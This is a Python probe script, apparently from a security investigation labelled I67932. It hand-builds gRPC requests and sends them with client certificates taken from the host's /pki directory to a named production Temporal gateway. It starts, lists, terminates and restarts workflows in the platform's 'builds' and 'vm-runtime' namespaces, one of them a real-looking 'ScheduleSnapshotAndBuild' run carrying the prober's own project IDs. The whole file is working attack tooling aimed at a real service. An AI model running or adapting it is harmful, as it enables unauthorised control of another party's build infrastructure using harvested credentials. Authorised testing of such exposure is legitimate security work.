#!/usr/bin/env python3
# I67932 probe3: valid StartWorkflowExecution in platform ns (noop type / fake queue only), verify + terminate
import subprocess, struct, json, sys, os, time, re

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
TS = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
CTR = [0]
T = '/temporal.api.workflowservice.v1.WorkflowService/'
MY = {'projectID': '104cdfa2-f46b-45ed-b2b9-ec4db24b1b3f',
      'environmentID': '6bd910b8-f1f5-43e5-b497-5bc2a4c55e3d',
      'serviceID': '185f72a5-3373-41c1-982c-2af89c6e1191',
      'deploymentID': 'i67932-selftest'}


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l])); i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4])); i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8])); i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def call(path, body=b'', timeout=25):
    CTR[0] += 1
    fu = '/tmp/w%d.bin' % CTR[0]
    hu = '/tmp/wh%d.txt' % CTR[0]
    bu = '/tmp/wb%d.bin' % CTR[0]
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
            '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    t0 = time.time()
    p = subprocess.run(args, capture_output=True, text=True)
    dt = round(time.time() - t0, 2)
    hdr = ''
    try:
        hdr = open(hu, 'rb').read().decode('utf-8', 'replace')
    except Exception:
        pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    for f in (fu, hu, bu):
        try:
            os.unlink(f)
        except Exception:
            pass
    return {'st': (sts[-1] if sts else '-'), 'msg': (msgs[-1].strip()[:160] if msgs else ''),
            'n': len(data), 'data': data, 'dt': dt}


def payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def p1(tag, path, body=b''):
    r = call(path, body)
    print('R|%s|st=%s|len=%d|t=%s|m=%s' % (tag, r['st'], r['n'], r['dt'], r['msg']), flush=True)
    if r['n'] > 5:
        pl = payload(r['data'])
        s = ' '.join(x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{3,}', pl))
        if s:
            print('  P|' + s[:240], flush=True)
    return r


def wfe(wid, rid=''):
    return fs(1, wid) + (fs(2, rid) if rid else b'')


def start_body(ns, wid, wtype, tq, inp=None, reuse=None):
    b = fs(1, ns) + fs(2, wid) + fmsg(3, fs(1, wtype)) + fmsg(4, fs(1, tq))
    if inp is not None:
        data = json.dumps(inp).encode()
        b += fmsg(5, fmsg(1, fs(2, data)))  # Payloads{payloads=[Payload{data=json}]}
    b += fv(7, 30) + fs(10, 'i67932-selftest') + fs(11, 'i67932-req-' + TS)
    if reuse is not None:
        b += fv(11, reuse)
    return b


def runid_of(r):
    if r['st'] != '0':
        return ''
    try:
        for f, w, v in parse(payload(r['data'])):
            if f == 1 and w == 2:
                return v.decode()
    except Exception:
        pass
    return ''


def do_start(tag, ns, wid, wtype, inp):
    r = p1('START|%s|%s' % (tag, ns), T + 'StartWorkflowExecution', start_body(ns, wid, wtype, 'i67932-noop-tq', inp))
    rid = runid_of(r)
    if not rid:
        return ''
    print('  RUNID|%s|%s' % (wid, rid), flush=True)
    time.sleep(1)
    p1('VISIBLE|List|%s' % ns, T + 'ListWorkflowExecutions',
       fs(1, ns) + fv(2, 2) + fs(4, 'WorkflowId="%s"' % wid))
    time.sleep(0.6)
    p1('TERMINATE|%s|%s' % (tag, ns), T + 'TerminateWorkflowExecution',
       fs(1, ns) + fmsg(2, wfe(wid, rid)) + fs(3, 'i67932-selftest cleanup') + fs(5, 'i67932') + fs(6, rid))
    time.sleep(0.8)
    p1('DESCRIBE|%s|%s' % (tag, ns), T + 'DescribeWorkflowExecution', fs(1, ns) + fmsg(2, wfe(wid, rid)))
    return rid


print('===I67932-P3 START=== ' + TS, flush=True)
print('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(), flush=True)
p1('CTL|GetSystemInfo', T + 'GetSystemInfo')

print('===A START noop (no input) in builds ===', flush=True)
wid = 'i67932-noop-builds-' + TS
rid = do_start('NOOP', 'builds', wid, 'I67932NoopProbe', None)

print('===B START own-ids payload, ScheduleSnapshotAndBuild, fake tq ===', flush=True)
wid2 = 'i67932-ownids-' + TS
rid2 = do_start('OWNIDS', 'builds', wid2, 'ScheduleSnapshotAndBuild', MY)

print('===C START noop in vm-runtime ===', flush=True)
wid3 = 'i67932-noop-vmruntime-' + TS
rid3 = do_start('NOOP', 'vm-runtime', wid3, 'I67932NoopProbe', {'probe': 'i67932'})

print('===D REUSE control (start same wid again after terminate) ===', flush=True)
if rid:
    p1('REUSE|builds|same-wid', T + 'StartWorkflowExecution',
       start_body('builds', wid, 'I67932NoopProbe', 'i67932-noop-tq', None, reuse=2))
    print('===I67932-P3 END===', flush=True)
